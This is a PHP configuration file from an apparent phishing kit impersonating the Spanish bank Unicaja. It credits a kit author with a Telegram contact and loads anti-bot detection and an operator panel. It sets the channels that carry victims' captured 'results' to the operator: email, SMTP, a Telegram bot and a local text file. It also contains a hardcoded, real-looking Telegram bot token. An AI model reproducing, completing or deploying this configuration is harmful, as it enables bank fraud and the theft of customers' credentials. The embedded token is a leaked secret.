<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    define("ANTIBOT_API", 'API_HERE');
    require_once 'detect.php';
    require_once 'functions.php';
    passport();
    require_once 'panel.php';
    define("PASSWORD", 'unicaja');
    define("PANEL", 'http://localhost/unicaja/panel/');
    define("TEMPLATES", 'http://localhost/unicaja/_templates/');
    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '922882072:AAFmSUMr1wzlrulYS6YIfGdeWAI8VnDnWg8');
    define("TELEGRAM_CHAT_ID", '1049319923');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'my_result002.txt');
    define("OFFICIAL_WEBSITE", 'http://localhost/');

    define("RECEIVE_VIA_EMAIL", 1); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 1); // Receive the results on txt file : 0 or 1
?>